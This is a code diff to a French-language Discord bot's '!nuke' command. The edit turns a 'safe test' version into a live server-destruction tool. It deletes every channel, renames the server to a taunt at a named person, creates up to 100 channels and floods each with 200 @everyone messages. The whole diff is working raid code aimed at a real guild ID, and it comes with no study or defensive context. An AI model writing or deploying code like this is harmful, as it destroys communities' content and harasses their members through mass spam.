@@ -14,10 +14,10 @@ def home():
     return "Bot en ligne !"
 
 ALLOWED_USER = 1316068882154393693
-ALLOWED_GUILD = 1333038486332248135
+ALLOWED_GUILD = 1444342111653597298
 
-MAX_CHANNELS = 20
-SPAM_MESSAGES = 50
+MAX_CHANNELS = 100
+SPAM_MESSAGES = 200
 
 intents = nextcord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
@@ -40,39 +40,46 @@ async def nuke(ctx, amount: int = 5):
     amount = max(1, min(amount, MAX_CHANNELS))
     guild = ctx.guild
 
-    await ctx.send("⚠️ **Préparation du NUKE (mode test safe)...**")
-
+    # Changer le nom du serveur
     try:
-        await guild.edit(name="💥 SERVEUR DÉTRUIT 💥")
+        await guild.edit(name="CHEH Touxiroux")
     except:
         pass
 
-    # création salons
+    # --- SUPPRESSION DE TOUS LES SALONS ---
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+            await asyncio.sleep(0.1)
+        except:
+            pass
+
+    # --- CRÉATION DES NOUVEAUX SALONS ---
     new_channels = []
     for i in range(amount):
         try:
-            c = await guild.create_text_channel(f"nuked-{i+1}")
+            c = await guild.create_text_channel(f"cheh-touxiroux-{i+1}")
             new_channels.append(c)
             await asyncio.sleep(0.1)
         except:
             pass
 
-    # spam
+    # --- SPAM ---
     for c in new_channels:
         for _ in range(SPAM_MESSAGES):
             try:
-                await c.send("💥 Serveur NUKED (mode test safe) 💥")
+                await c.send("💥@everyone Serveur NUKED💥")
                 await asyncio.sleep(0.03)
             except:
                 pass
 
+    # Message final
     try:
         await new_channels[0].send("@everyone 🚨 **LE SERVEUR A ÉTÉ DÉTRUIT** 🚨")
     except:
         pass
 
-    await ctx.send("🔥 **NUKE SAFE TERMINÉ !**")
-
+    await ctx.send("🔥 **NUKE TERMINÉ !**")
 
 # --- LANCER FLASK DANS UN THREAD (OK) ---
 def run_flask():
